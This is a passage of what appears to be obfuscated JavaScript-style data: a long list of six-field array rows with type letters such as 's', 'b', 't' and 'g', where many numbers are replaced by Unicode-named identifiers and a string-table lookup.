			[1, "s", ΔΔΔ, 42, 203, ⵠΔΔ],
			[1, "s", 0, 47, 196, ⵠΔΔ],
			[ⵠΔⲆ, "b", 2, 40, 196, Δⵠᐃ],
			[1, "t", 4, 39, 197, ΔΔⵠ],
			[ΔΔΔ, "t", ᐃΔΔΔ, 44, 187, ᐃⵠⲆ],
			[ᐃᐃⵠ, "b", 1, 46, 181, ΔⲆⲆ],
			[1, "t", ⵠⵠΔⲆ, 47, 182, ᐃΔΔ],
			[ⵠΔᐃ, "b", ⲆΔⵠ, 57, 182, ᐃΔΔ],
			[1, "b", 3, 56, 183, 0],
			[1, "t", ⲆΔⵠᐃ, 55, 184, ΔΔⵠ],
			[Ⲇᐃⵠ, "t", 5, 62, 195, ᐃΔΔ],
			[1, "s", 1, 51, 185, ⵠΔᐃ],
			[Ⲇᐃⵠ, "s", 2, 62, 180, Ⲇᐃⵠ],
			[1, "s", 2, 61, 188, ᐃⲆᐃ],
			[1, "s", ⵠⲆΔ, 61, 189, ⵠΔᐃ],
			[ΔⲆⵠ, "s", 2, 48, 195, 1],
			[ⵠΔᐃ, "b", 1, 51, 199, ΔⲆⲆ],
			[ⵠⲆΔ, "t", ΔⵠᐃⲆ, 52, 199, ᐃΔΔ],
			[ᐃᐃⵠ, "t", ᐃⲆᐃᐃ, 56, 204, 0],
			[ⵠⲆΔ, "t", 4, 57, 204, ⲆΔⵠ],
			[1, "t", ⵠᐃΔΔ, 51, 204, 0],
			[ⵠΔᐃ, "s", 1, 52, 205, 1],
			[1, "s", 2, 57, 200, Ⲇᐃⵠ],
			[ⵠΔⲆ, "s", 1, 56, 199, ⵠΔᐃ],
			[1, "b", ΔΔⵠ, 55, 192, ᐃⵠΔ],
			[1, "t", 3, 56, 193, 0],
			[ᐃⲆᐃ, "t", 4, 50, 190, ᐃⵠⲆ],
			[ᐃᐃⵠ, "b", ⵠΔⲆ, 76, 188, ᐃΔΔ],
			[ⵠΔΔ, "t", ⵠⵠΔⲆ, 75, 188, ᐃⵠⲆ],
			[ᐃⲆᐃ, "t", ⵠⵠⵠΔ, 73, 192, 0],
			[1, "t", 4, 72, 191, 0],
			[1, "t", ᐃΔΔΔ, 78, 193, ᐃΔΔ],
			[Ⲇᐃⵠ, "b", ⵠⲆⲆ, 79, 192, Δⵠᐃ],
			[ⵠΔᐃ, "s", ⲆᐃᐃⲆ, 79, 190, ΔΔΔ],
			[1, "s", ΔⲆⵠ, 74, 194, Ⲇᐃⵠ],
			[1, "s", ⵠΔᐃ, 72, 187, ⵠΔⲆ],
			[ⵠΔΔ, "s", ΔⲆⲆ, 74, 183, ᐃⲆᐃ],
			[ⵠΔⲆ, "s", 1, 75, 183, 1],
			[1, "t", ⵠⵠⵠΔ, 69, 181, ᐃΔΔ],
			[ΔΔΔ, "t", ⵠⲆⵠᐃ, 70, 182, 0],
			[1, "t", 5, 69, 180, ᐃⵠΔ],
			[1, "b", ⵠΔᐃ, 65, 189, 0],
			[1, "b", 2, 66, 189, 0],
			[1, "t", 3, 64, 188, ⲆΔⵠ],
			[Ⲇᐃⵠ, "t", ⲆⲆⲆΔ, 67, 192, ⵠⲆⲆ],
			[ⵠΔⲆ, "b", 2, 85, 183, 0],
			[1, "t", Ⲇᐃⵠ, 84, 184, ᐃⵠΔ],
			[ᐃᐃⵠ, "t", ⲆΔⵠᐃ, 81, 180, ᐃⵠΔ],
			[ᐃⲆᐃ, "t", 5, 89, 180, ⲆΔⵠ],
			[ⵠⲆΔ, "t", ⲆΔⵠ, 90, 188, 0],
			[ⵠΔΔ, "t", 3, 89, 190, 0],
			[1, "s", 1, 87, 187, 1],
			[1, "s", 2, 87, 197, 1],
			[ᐃⲆᐃ, "b", ⵠⲆΔ, 84, 200, 0],
			[ᐃⲆᐃ, "t", ᐃⲆΔⲆ, 83, 201, 0],
			[ⵠΔΔ, "t", 4, 87, 207, ᐃⵠΔ],
			[ᐃᐃⵠ, "s", ⵠⵠⵠΔ, 79, 202, 1],
			[1, "s", ⵠΔᐃ, 80, 203, ᐃⲆᐃ],
			[Ⲇᐃⵠ, "t", 0, 71, 200, 0],
			[ᐃⲆᐃ, "b", 2, 72, 201, 0],
			[ᐃᐃⵠ, "t", ⲆᐃᐃⲆ, 65, 205, ΔΔⵠ],
			[1, "t", ᐃᐃⵠ, 66, 206, 0],
			[ᐃⲆᐃ, "t", 4, 63, 209, ᐃⵠⲆ],
			[ⵠΔΔ, "t", 5, 73, 203, ⵠⲆⲆ],
			[ΔΔΔ, "s", 0, 70, 207, Ⲇᐃⵠ],
			[1, "s", ⵠΔⲆ, 71, 206, ΔΔΔ],
			[ΔΔΔ, "s", 2, 68, 199, ΔⲆⵠ],
			[1, "s", 1, 64, 213, 1],
			[1, "t", 0, 85, 213, 0],
			[1, "b", ⵠⵠⵠΔ, 84, 212, ⵠⲆⲆ],
			[ᐃⲆᐃ, "t", ᐃⲆᐃᐃ, 77, 209, 0],
			[ⵠⲆΔ, "t", ⲆΔⵠᐃ, 83, 216, ⲆΔⵠ],
			[1, "t", ⵠᐃΔΔ, 73, 209, ᐃΔΔ],
			[ⵠΔΔ, "b", 0, 86, 222, 0],
			[ᐃᐃⵠ, "b", 3, 87, 221, 0],
			[1, "s", ΔΔΔ, 80, 214, ᐃⲆᐃ],
			[ᐃᐃⵠ, "s", ⵠⵠⵠΔ, 87, 216, 1],
			[1, "s", 2, 84, 224, 1],
			[1, "s", ⵠΔᐃ, 77, 227, ⵠΔᐃ],
			[1, "t", 1, 74, 222, ΔⲆⲆ],
			[Ⲇᐃⵠ, "b", 1, 69, 218, 0],
			[ⵠⲆΔ, "b", 2, 75, 219, 0],
			[ⵠΔⲆ, "s", ΔⵠᐃⲆ, 74, 218, 1],
			[1, "s", ᐃᐃⵠ, 69, 223, 1],
			[1, "s", 1, 77, 221, 1],
			[1, "b", 1, 72, 211, ΔΔⵠ],
			[1, "b", ΔⲆⵠ, 85, 232, 0],
			[1, "t", ᐃⲆΔⲆ, 84, 233, 0],
			[1, "t", ᐃⲆⵠᐃ, 78, 238, 0],
			[1, "b", 1, 77, 237, 0],
			[1, "t", 5, 87, 236, 0],
			[1, "t", 5, 76, 229, ⵠⲆⲆ],
			[1, "b", 2, 74, 241, ⲆΔⵠ],
			[1, "s", ᐃⵠⲆ, 73, 242, ᐃᐃⵠ],
			[1, "s", 0, 81, 238, ᐃᐃⵠ],
			[1, "s", ᐃⲆᐃ, 82, 237, 1],
			[1, "s", 2, 72, 237, ᐃⲆᐃ],
			[ΔΔΔ, "s", 2, 78, 242, 1],
			[1, "b", ⵠΔᐃ, 66, 230, ΔΔⵠ],
			[1, "b", ᐃⲆΔⲆ, 62, 229, ᐃⵠⲆ],
			[1, "t", ⲆᐃᐃΔ, 67, 231, Δⵠᐃ],
			[1, "t", Ⲇᐃⵠᐃ, 62, 228, ΔΔⵠ],
			[ᐃⲆᐃ, "t", ⲆΔΔᐃ, 64, 233, 0],
			[ⵠΔΔ, "t", 2, 65, 234, ⲆΔⵠ],
			[ΔΔΔ, "t", ⲆⲆΔᐃ, 51, 220, 0],
			[ⵠΔΔ, "t", 1, 50, 218, 0],
			[Ⲇᐃⵠ, "b", 1, 45, 223, 0],
			[ⵠⲆΔ, "b", ⲆᐃᐃⲆ, 46, 224, 0],
			[ᐃⲆᐃ, "t", ᐃⵠⵠΔ, 49, 218, ΔⲆⲆ],
			[1, "t", 4, 47, 225, ΔⲆⲆ],
			[1, "s", 1, 50, 215, Ⲇᐃⵠ],
			[ⵠΔᐃ, "s", 2, 51, 213, 1],
			[ⵠΔⲆ, "s", ᐃⲆⵠᐃ, 42, 227, ΔⲆⵠ],
			[ΔⲆⵠ, "s", ⵠⲆΔ, 44, 227, 1],
			[Ⲇᐃⵠ, "s", ᐃᐃⵠ, 60, 230, ⵠΔⲆ],
			[ⵠⲆΔ, "s", 2, 59, 231, ⵠⲆΔ],
			[1, "b", 1, 85, 252, ᐃⵠⲆ],
			[Ⲇᐃⵠ, "t", 2, 84, 251, ᐃΔΔ],
			[1, "t", 2, 74, 250, 0],
			[ᐃᐃⵠ, "t", 0, 75, 251, ⵠⲆⲆ],
			[1, "b", ᐃⵠⲆ, 83, 246, 0],
			[1, "t", 3, 82, 247, 0],
			[ⵠΔⲆ, "t", ⵠⲆⵠᐃ, 81, 259, 0],
			[1, "t", ⲆΔⵠᐃ, 69, 249, 0],
			[1, "t", 5, 87, 246, ⲆΔⵠ],
			[1, "t", ᐃⲆⵠⵠ, 75, 252, 0],
			[ᐃᐃⵠ, "s", ⵠΔΔ, 79, 257, ΔⲆⵠ],
			[1, "s", ᐃⲆⵠᐃ, 78, 249, 1],
			[1, "s", ⵠⵠΔⲆ, 80, 258, 1],
			[ᐃᐃⵠ, "s", 1, 88, 254, ⵠΔᐃ],
			[ⵠΔΔ, "s", ᐃᐃⵠ, 85, 264, ᐃᐃⵠ],
			[1, "s", 2, 89, 263, 1],
			[ᐃⲆᐃ, "s", 2, 87, 269, 1],
			[1, "s", 0, 84, 268, 1],
			[1, "s", 2, 76, 267, ⵠΔⲆ],
			[ⵠⲆΔ, "s", 1, 66, 261, 1],
			[1, "s", ΔⲆⵠ, 87, 274, 1],
			[ᐃⲆᐃ, "s", 1, 76, 263, ⵠΔⲆ],
			[ⵠΔΔ, "s", 1, 59, 251, ⵠΔᐃ],
			[1, "s", 0, 59, 252, ΔⲆⵠ],
			[ΔΔΔ, "t", ᐃⲆⵠᐃ, 86, 265, 0],
			[1, "t", 0, 78, 270, 0],
			[ⵠⲆΔ, "t", ⵠⵠⵠΔ, 79, 271, ⵠⲆⲆ],
			[ⵠΔΔ, "t", ᐃⵠΔ, 77, 260, 0],
			[1, "t", 3, 78, 261, 0],
			[1, "b", ⵠΔΔ, 71, 264, 0],
			[ⵠΔⲆ, "b", 1, 88, 269, 0],
			[ⵠΔᐃ, "t", 5, 84, 264, 0],
			[ΔⲆⵠ, "t", ⵠᐃΔⵠ, 79, 261, ΔΔⵠ],
			[ⵠΔⲆ, "t", ΔⵠⲆⲆ, 72, 265, ΔΔⵠ],
			[1, "t", ⵠⵠΔΔ, 77, 270, ᐃⵠⲆ],
			[ᐃⲆᐃ, "t", 0, 87, 261, ⵠⲆⲆ],
			[ⵠΔⲆ, "t", ⲆⲆΔᐃ, 86, 260, ΔΔⵠ],
			[ⵠΔᐃ, "t", ⲆⵠΔⵠ, 84, ᐃᐃⲆⵠⲆ, ᐃⵠΔ],
			[1, "t", 4, 68, 255, ΔⲆⲆ],
			[ᐃᐃⵠ, "t", ᐃᐃⵠ, 67, 254, ⵠⲆⲆ],
			[1, "t", 2, 65, 262, ⲆΔⵠ],
			[ⵠΔᐃ, "t", 1, 57, 260, 0],
			[1, "t", 2, 58, 259, 0],
			[1, "b", ᐃⲆᐃ, 63, 256, 0],
			[ⵠΔⲆ, "b", 1, 52, 248, 0],
			[Ⲇᐃⵠ, "t", ⲆⲆΔᐃ, 53, 248, 0],
			[ᐃⲆᐃ, "s", 1, 50, 253, ⵠΔΔ],
			[1, "s", ᐃⲆΔⲆ, 67, 263, 1],
			[ⵠΔⲆ, "s", 2, 52, 252, ΔⲆⵠ],
			[ΔΔΔ, "s", ΔⵠᐃⲆ, 71, 244, ᐃⲆᐃ],
			[1, "b", ᐃΔΔ, 57, 245, ᐃⵠΔ],
			[1, "t", ΔⵠᐃⲆ, 58, 244, ΔⲆⲆ],
			[ᐃⲆᐃ, "b", ⵠⲆΔ, 53, 237, 0],
			[1, "t", 2, 54, 237, 0],
			[1, "t", ⲆᐃᐃⲆ, 41, 238, 0],
			[1, "t", 1, 42, 237, ᐃⵠΔ],
			[Ⲇᐃⵠ, "t", 5, 57, 235, 0],
			[ᐃⲆᐃ, "t", ΔⵠⲆⲆ, 60, 246, ⲆΔⵠ],
			[ⵠΔᐃ, "t", ᐃΔΔⲆ, 50, 252, 0],
			[1, "t", 1, 42, 248, ᐃⵠΔ],
			[ᐃⲆᐃ, "b", 1, 43, 249, 0],
			[ⵠΔᐃ, "b", 3, 37, 243, ΔΔⵠ],
			[ΔⲆⵠ, "s", ᐃⵠⲆ, 50, 236, ⵠΔᐃ],
			[1, "s", ⵠⵠⵠΔ, 39, 247, 1],
			[ΔⲆⵠ, "s", ⲆᐃᐃⲆ, 51, 235, 1],
			[ⵠΔⲆ, "s", 2, 60, 243, ⵠⲆΔ],
			[1, "s", ⲆᐃᐃⲆ, 36, 240, 1],
			[ⵠΔΔ, "s", ᐃⲆΔⲆ, 43, 254, ᐃⲆᐃ],
			[1, "s", 1, 42, 254, 1],
			[1, "t", ⵠΔᐃ, 38, 233, 0],
			[1, "t", 2, 35, 235, 0],
			[1, "t", 4, 33, 228, 0],
			[1, "t", Ⲇⵠⵠⵠ, 33, 245, 0],
			[1, "t", ⵠⲆⵠᐃ, 43, 235, 0],
			[ΔⲆⵠ, "t", 5, 45, 249, 0],
			[1, "t", 5, 41, 253, 0],
			[1, "b", 1, ⵠᐃΔᐃᐃ, 227, 0],
			[1, "b", ⵠΔΔ, 14, 240, 0],
			[1, "t", ᐃⲆᐃᐃ, 21, 227, ᐃⵠⲆ],
			[1, "t", ΔⲆΔᐃ, 27, 234, ΔΔⵠ],
			[Ⲇᐃⵠ, "t", ᐃⲆᐃᐃ, ΔⵠΔᐃⵠ, 241, 0],
			[1, "t", ᐃⲆΔⵠ, 12, 229, ᐃⵠΔ],
			[ⵠΔᐃ, "t", 4, ⲆⲆⲆⵠⲆ, 224, 0],
			[ΔⲆⵠ, "t", 4, 11, 231, 0],
			[1, "t", ⵠΔᐃΔ, 22, 238, ᐃⵠⲆ],
			[ⵠⲆΔ, "t", ⵠᐃΔΔ, ⲆⲆΔᐃᐃⲆⲆ, 239, ⵠⲆⲆ],
			[ᐃᐃⵠ, "t", 1, 22, 243, 0],
			[1, "b", ᐃⲆⵠᐃ, 23, 242, 0],
			[1, "s", ⵠⲆΔ, 23, 238, 1],
			[ᐃᐃⵠ, "s", ΔⲆⵠ, 22, 228, ΔΔΔ],
			[ΔⲆⵠ, "s", 2, 24, 228, 1],
			[1, "s", 2, 21, 236, 1],
			[1, "s", 0, 13, 228, ⵠΔᐃ],
			[ⵠΔᐃ, "s", 0, ⵠΔⲆᐃᐃ, 242, 1],
			[Ⲇᐃⵠ, "s", ⵠΔΔ, ΔⲆΔⲆⲆ, 244, 1],
			[1, "s", 1, 34, 236, 1],
			[1, "t", 1, 26, 249, ᐃⵠΔ],
			[ⵠΔⲆ, "t", ⵠΔᐃ, 22, 256, ΔΔⵠ],
			[ΔΔΔ, "t", 2, 23, 255, ᐃⵠΔ],
			[1, "b", Ⲇᐃⵠ, 17, ⵠⵠⵠΔΔΔΔ, ᐃΔΔ],
			[1, "b", ΔⵠᐃⲆ, ᐃΔᐃΔᐃ, ⵠⵠⵠΔΔΔΔ, 0],
			[1, "s", 0, 21, 252, ⵠΔᐃ],
			[1, "s", ⵠⵠΔⲆ, ⵠᐃΔᐃᐃ, 250, 1],
			[1, "s", ᐃⲆⵠᐃ, 23, 259, 1],
			[1, "s", 1, ⲆⲆΔⵠᐃ, 257, 1],
			[ⵠⲆΔ, "t", 1, 31, 254, 0],
			[1, "t", ΔⵠᐃⲆ, 32, 254, 0],
			[ⵠΔᐃ, "t", 4, 28, 254, 0],
			[ΔΔΔ, "t", ⲆᐃᐃΔ, 34, 258, 0],
			[ᐃⲆᐃ, "t", ΔⲆⲆ, 29, 260, 0],
			[1, "b", 2, 30, 261, Δⵠᐃ],
			[ᐃᐃⵠ, "t", ΔⲆⲆ, 43, 262, 0],
			[1, "t", 2, 42, 263, 0],
			[Ⲇᐃⵠ, "t", ⵠᐃᐃⲆ, 46, 264, 0],
			[1, "b", ⵠΔⲆ, 39, 265, 0],
			[1, "b", ⵠΔᐃ, 58, 267, 0],
			[1, "t", ⲆᐃᐃⲆ, 57, 268, ᐃΔΔ],
			[1, "t", 4, 62, 270, 0],
			[1, "t", 5, 52, 273, 0],
			[1, "s", ΔⲆⵠ, 52, 269, ⵠⲆΔ],
			[ᐃᐃⵠ, "s", ᐃⲆᐃ, 41, 272, Ⲇᐃⵠ],
			[1, "s", ⲆᐃᐃⲆ, 41, 274, ⵠΔᐃ],
			[ⵠΔᐃ, "t", 2, 42, 268, ⵠⲆⲆ],
			[1, "t", ᐃⵠⲆ, 43, 268, 0],
			[1, "b", 1, 46, 272, ᐃⵠΔ],
			[ⵠΔⲆ, "b", ⵠⲆΔ, ΔⵠⵠⲆⵠ, 265, ᐃⵠⲆ],
			[ⵠΔΔ, "t", ΔⵠᐃⲆ, ⵠⵠⵠⵠΔ, 266, 0],
			[ⵠΔⲆ, "t", ⲆⲆⲆΔ, ᐃΔΔⲆΔ, 264, 0],
			[ᐃᐃⵠ, "t", 4, 29, 263, 0],
			[1, "t", ⲆᐃᐃΔ, 11, 269, 0],
			[1, "t", ⵠⲆΔ, 29, 271, ΔⲆⲆ],
			[1, "b", 2, 28, 272, 0],
			[1, "t", ᐃⲆΔⲆ, 24, 267, 0],
			[1, "t", ᐃⲆⵠᐃ, ᐃΔᐃⲆⵠ, 279, ᐃΔΔ],
			[1, "t", ᐃⵠⲆ, 19, 278, ᐃΔΔ],
			[ᐃᐃⵠ, "t", ᐃⲆΔⵠ, ᐃⲆⵠᐃⲆ, 278, ΔΔⵠ],
			[ⵠⲆΔ, "b", ⵠⲆⲆ, 21, 284, ⲆΔⵠ],
			[1, "b", 0, ᐃΔΔⵠᐃ, 289, 0],
			[ⵠⲆΔ, "t", ᐃⲆΔⲆ, 20, 283, 0],
			[1, "t", ⲆᐃᐃⲆ, ΔΔⲆᐃⵠ, 290, ΔⲆⲆ],
			[1, "t", 4, 19, 283, 0],
			[1, "t", ⲆⵠΔⵠ, ⲆⵠᐃᐃⲆ, 290, 0],
			[1, "s", ΔⲆⵠ, 16, 285, ᐃᐃⵠ],
			[1, "s", ⵠΔᐃ, 24, 288, Ⲇᐃⵠ],
			[1, "s", ⲆᐃᐃⲆ, 26, 287, 1],
			[ᐃⲆᐃ, "s", ᐃⲆΔⲆ, ΔΔᐃᐃΔ, 278, ᐃᐃⵠ],
			[ᐃᐃⵠ, "s", ΔⲆⵠ, 21, 268, 1],
			[1, "s", 2, ᐃⲆᐃⵠⵠ, 268, 1],
			[1, "t", ⵠⲆⲆ, ⲆΔⲆΔⲆ, 294, ⲆΔⵠ],
			[Ⲇᐃⵠ, "b", 1, 13, 295, 0],
			[ΔⲆⵠ, "t", ⵠⵠⵠᐃ, 13, 291, ΔⲆⲆ],
			[ⵠΔⲆ, "t", ᐃⲆᐃᐃ, ⲆΔΔᐃᐃ, 299, ᐃΔΔ],
			[ⵠΔᐃ, "t", 4, ΔⵠᐃΔⵠ, 287, ᐃⵠⲆ],
			[ᐃᐃⵠ, "t", ⵠᐃᐃⲆ, ΔⵠⲆᐃⵠⲆᐃ, 298, 0],
			[ΔΔΔ, "t", 1, 27, 294, ⲆΔⵠ],
			[ᐃⲆᐃ, "b", 2, 26, 295, 0],
			[ⵠΔᐃ, "t", 3, 33, 297, 0],
			[ᐃᐃⵠ, "b", ΔⲆⵠ, 48, 278, 0],
			[1, "b", ΔⲆⲆ, 46, 280, 0],
			[ΔⲆⵠ, "b", ΔⵠᐃⲆ, 50, 280, ΔⲆⲆ],
			[1, "t", 0, 44, 282, 0],
			[1, "b", ⵠΔⲆ, 49, 283, 0],
			[ᐃⲆᐃ, "b", 0, 51, 278, 0],
			[ᐃⲆᐃ, "b", ⲆΔⵠⵠ, 50, 279, 0],
			[1, "b", ⵠⵠⵠᐃ, 44, 284, ΔⲆⲆ],
			[ⵠⲆΔ, "b", ΔΔⵠ, 47, 284, ᐃⵠⲆ],
			[Ⲇᐃⵠ, "b", ᐃⲆΔⲆ, 42, 283, 0],
			[1, "t", 4, 51, 277, 0],
			[1, "b", ⵠΔⲆ, 44, 286, ᐃⵠΔ],
			[1, "b", ⵠⵠⵠΔ, 46, 286, ᐃⵠΔ],
			[1, "b", 1, 42, 285, ΔΔⵠ],
			[Ⲇᐃⵠ, "b", 3, 41, 286, ⵠⲆⲆ],
			[ᐃᐃⵠ, "t", ⵠⵠΔΔ, 42, 287, 0],
			[1, "b", 1, 42, 278, ΔⲆⲆ],
			[ⵠΔΔ, "b", ⲆᐃᐃⲆ, 43, 279, ᐃΔΔ],
			[ΔⲆⵠ, "b", ᐃⵠΔ, 40, 280, 0],
			[1, "t", ᐃⵠⵠΔ, 39, 283, ᐃⵠΔ],
			[ⵠⲆΔ, "t", ⵠΔᐃΔ, 39, 279, ⲆΔⵠ],
			[1, "t", 5, 43, 277, 0],
			[ᐃⲆᐃ, "t", ᐃΔΔⲆ, 47, 287, ᐃⵠΔ],
			[1, "t", ⵠᐃᐃⲆ, 46, 277, Δⵠᐃ],
			[1, "t", ⲆᐃᐃΔ, 45, 290, ΔΔⵠ],
			[ⵠΔᐃ, "t", 4, 36, 285, ΔⲆⲆ],
			[1, "t", ᐃⲆΔⵠ, 35, 284, 0],
			[1, "t", 3, 36, 272, 0],
			[1, "t", 4, 35, 271, 0],
			[Ⲇᐃⵠ, "t", Ⲇᐃⵠ, 29, 279, ᐃⵠΔ],
			[ᐃᐃⵠ, "b", 1, 32, 277, Δⵠᐃ],
			[1, "t", 3, 31, 278, 0],
			[ΔⲆⵠ, "b", 2, 28, 280, ᐃⵠⲆ],
			[ⵠΔΔ, "t", 4, 29, 286, ᐃⵠΔ],
			[1, "t", 5, 28, 275, 0],
			[Ⲇᐃⵠ, "t", 3, 37, 292, 0],
			[1, "b", ΔΔΔ, 36, 291, ᐃⵠΔ],
			[ⵠΔᐃ, "b", Δⵠᐃ, 34, 298, 0],
			[1, "t", ⲆΔⵠᐃ, 31, 292, ᐃΔΔ],
			[ⵠΔⲆ, "t", 4, 46, 295, ᐃΔΔ],
			[ⵠⲆΔ, "t", 4, 59, 287, ⵠⲆⲆ],
			[ⵠΔⲆ, "b", ΔⲆⵠ, 58, 286, ⲆΔⵠ],
			[ᐃᐃⵠ, "s", 1, 68, 284, Ⲇᐃⵠ],
			[1, "s", 2, 70, 286, ΔⲆⵠ],
			[ⵠΔⲆ, "s", 0, 67, 284, 1],
			[ⵠΔΔ, "t", 3, 66, 283, 0],
			[1, "t", ΔΔΔ, 65, 282, 0],
			[1, "b", 1, 64, 288, ⵠⲆⲆ],
			[1, "t", 3, 60, 293, ᐃⵠⲆ],
			[ΔΔΔ, "t", ⵠΔᐃ, 61, 294, ⲆΔⵠ],
			[1, "b", 1, 76, 294, ᐃΔΔ],
			[ᐃᐃⵠ, "t", 5, 75, 295, ΔⲆⲆ],
			[1, "t", 5, 56, 293, ᐃΔΔ],
			[1, "t", 5, 59, 281, ⲆΔⵠ],
			[1, "t", ⵠⵠΔΔ, 67, 291, 0],
			[ΔⲆⵠ, "b", 0, 88, 293, 0],
			[1, "t", ⵠⵠⵠΔ, 89, 292, ᐃⵠⲆ],
			[1, "t", 2, 85, 286, ⵠⲆⲆ],
			[1, "t", 4, 88, 289, ᐃⵠⲆ],
			[Ⲇᐃⵠ, "t", ⲆⵠΔⵠ, 79, 287, 0],
			[ⵠΔⲆ, "b", 1, 84, 285, 0],
			[ᐃᐃⵠ, "t", ⵠⵠⵠᐃ, 75, 284, ⵠⲆⲆ],
			[ⵠΔⲆ, "b", ⲆΔⵠ, 75, 278, 0],
			[1, "t", ΔⲆΔᐃ, 74, 277, ᐃΔΔ],
			[1, "t", ⵠᐃΔΔ, 81, 276, 0],
			[Ⲇᐃⵠ, "t", ᐃⲆΔⲆ, 65, 276, ᐃⵠΔ],
			[1, "b", ⵠΔⲆ, 66, 275, 0],
			[ⵠΔΔ, "g", 0, 45, 261, ΔΔΔ],
			[1, "g", ⵠΔᐃ, 39, 258, ⵠΔᐃ],
			[ⵠΔΔ, "g", ΔⲆⲆ, 35, 250, 1],
			[ᐃⲆᐃ, "g", 2, 22, 247, 1],
			[Ⲇᐃⵠ, "g", ⲆᐃᐃⲆ, 27, 227, ⵠΔᐃ],
			[1, "g", ⵠⵠΔⲆ, 63, 218, ᐃᐃⵠ],
			[ΔⲆⵠ, "g", ⵠΔΔ, 56, 224, 1],
			[ⵠΔᐃ, "g", ΔⲆⲆ, 46, 231, ΔⲆⵠ],
			[ⵠΔⲆ, "g", 1, 65, 240, 1],
			[1, "g", 2, 67, 238, ⵠⲆΔ],
			[ᐃᐃⵠ, "g", 2, 79, 232, 1],
			[1, "g", 2, 72, 253, ⵠΔΔ],
			[1, "g", ⲆⲆΔᐃ, 62, 264, 1],
			[ⵠⲆΔ, "g", 2, 28, 267, 1],
			[ⵠΔⲆ, "g", ⲆᐃᐃⲆ, 58, 274, ΔⲆⵠ],
			[Ⲇᐃⵠ, ⵠ[348], 2, ΔⲆᐃᐃᐃ, 182, ΔⲆⲆ],
			[ⵠⲆΔ, ⵠ[348], ⵠⵠΔⲆ, 24, 182, 0],
			[ᐃᐃⵠ, ⵠ[348], ΔⲆⲆ, 11, 185, 0],
			[ΔⲆⵠ, ⵠ[348], ᐃⵠΔ, ΔⵠⵠⲆⵠ, 194, ΔⲆⲆ],
			[ᐃᐃⵠ, ⵠ[348], 1, 25, 196, ᐃⵠⲆ],
			[1, ⵠ[348], ⲆΔⵠⵠ, 31, 183, 0],
			[ᐃⲆᐃ, ⵠ[348], 0, 38, 181, ΔⲆⲆ],
			[ᐃⲆᐃ, ⵠ[348], ⵠⵠΔⲆ, 45, 186, 0],
			[1, ⵠ[348], 1, 38, 191, 0],
			[ΔΔΔ, ⵠ[348], ⲆΔⵠ, 56, 181, 0],
			[ΔⲆⵠ, ⵠ[348], 1, 68, 182, ᐃΔΔ],
			[1, ⵠ[348], ᐃⲆⵠᐃ, 80, 181, 0],
			[ⵠΔᐃ, ⵠ[348], ᐃⲆᐃᐃ, 86, 187, 0],
			[ᐃⲆᐃ, ⵠ[348], ΔⲆⲆ, 84, 193, 0],
			[1, ⵠ[348], 1, 82, 201, ⲆΔⵠ],
			[1, ⵠ[348], 2, 64, 191, 0],
			[ΔΔΔ, ⵠ[348], ⲆⲆΔᐃ, 72, 200, 0],
			[1, ⵠ[348], ⵠⵠⵠᐃ, 64, 201, 0],
			[ⵠⲆΔ, ⵠ[348], 2, 76, 209, ⲆΔⵠ],
			[1, ⵠ[348], ΔⲆᐃⲆ, 71, 212, 0],
			[ⵠΔΔ, ⵠ[348], 1, 86, 214, ΔⲆⲆ],
			[1, ⵠ[348], ΔⲆⲆ, 57, 208, ΔΔⵠ],
			[ΔⲆⵠ, ⵠ[348], ᐃⵠΔ, 41, 203, 0],
			[1, ⵠ[348], 1, ΔⵠΔᐃⵠ, 206, 0],
			[1, ⵠ[348], ⵠⵠΔⲆ, 25, 209, ΔⲆⲆ],
			[1, ⵠ[348], ⲆᐃΔᐃ, 16, 218, Δⵠᐃ],
			[ΔΔΔ, ⵠ[348], ⲆᐃΔᐃ, 11, 227, 0],
			[ᐃᐃⵠ, ⵠ[348], ⲆΔⵠ, 22, 229, 0],
			[ᐃⲆᐃ, ⵠ[348], ⵠΔΔ, 15, 239, ᐃⵠΔ],
			[Ⲇᐃⵠ, ⵠ[348], ᐃⲆΔⲆ, 24, 238, 0],
			[ΔΔΔ, ⵠ[348], 3, 22, 246, 0],
			[1, ⵠ[348], 3, 10, 253, 0],
			[1, ⵠ[348], 1, 18, 258, 0],
			[1, ⵠ[348], ⵠΔᐃ, 28, 261, ⲆΔⵠ],
			[1, ⵠ[348], ⵠⲆΔ, ⵠⲆΔᐃᐃ, 267, ᐃⵠΔ],
			[ᐃⲆᐃ, ⵠ[348], ΔΔⵠ, 24, 268, ⵠⲆⲆ],
			[1, ⵠ[348], 0, Δᐃᐃᐃᐃⵠⵠ, 278, 0],
			[1, ⵠ[348], ᐃⲆΔⲆ, 21, 279, 0],
			[1, ⵠ[348], 2, 30, 272, ᐃⵠⲆ],
			[ᐃⲆᐃ, ⵠ[348], ⲆᐃᐃⲆ, 29, 281, 0],
			[Ⲇᐃⵠ, ⵠ[348], 2, 15, 284, 0],
			[1, ⵠ[348], 3, ⵠⲆⵠⲆⵠ, 291, 0],
			[ΔΔΔ, ⵠ[348], 3, 30, 287, 0],
			[ⵠΔⲆ, ⵠ[348], 3, 27, 293, ᐃΔΔ],
			[1, ⵠ[348], Δⵠᐃ, 25, 296, ᐃⵠΔ],
			[ᐃⲆᐃ, ⵠ[348], 0, ⵠⲆⲆᐃⲆⵠⵠ, 298, ⲆΔⵠ],
			[ᐃᐃⵠ, ⵠ[348], ᐃⵠΔ, 8, 286, 0],
			[ᐃⲆᐃ, ⵠ[348], 2, 36, 299, 0],
			[1, ⵠ[348], ᐃⲆⵠᐃ, 37, 280, 0],
			[ᐃᐃⵠ, ⵠ[348], 3, 38, 291, 0],
			[1, ⵠ[348], Ⲇᐃⵠ, 48, 287, ΔⲆⲆ],
			[1, ⵠ[348], 1, 46, 277, Δⵠᐃ],
			[ΔΔΔ, ⵠ[348], 1, 53, 278, 0],
			[1, ⵠ[348], ⲆΔⵠⵠ, 48, 295, 0],
			[1, ⵠ[348], 0, 57, 294, ᐃⵠΔ],
			[1, ⵠ[348], 1, 65, 290, ⵠⲆⲆ],
			[1, ⵠ[348], 1, 84, 292, 0],
			[ΔⲆⵠ, ⵠ[348], ⲆⲆΔᐃ, 77, 295, ΔⲆⲆ],
			[1, ⵠ[348], ⲆⲆΔᐃ, 84, 287, 0],
			[ΔⲆⵠ, ⵠ[348], 0, 74, 279, ⵠⲆⲆ],
			[ΔⲆⵠ, ⵠ[348], ⲆΔⵠⵠ, 65, 274, 0],
			[1, ⵠ[348], ⵠⵠΔⲆ, 71, 267, 0],
			[1, ⵠ[348], ᐃⲆΔⲆ, 65, 261, ⲆΔⵠ],
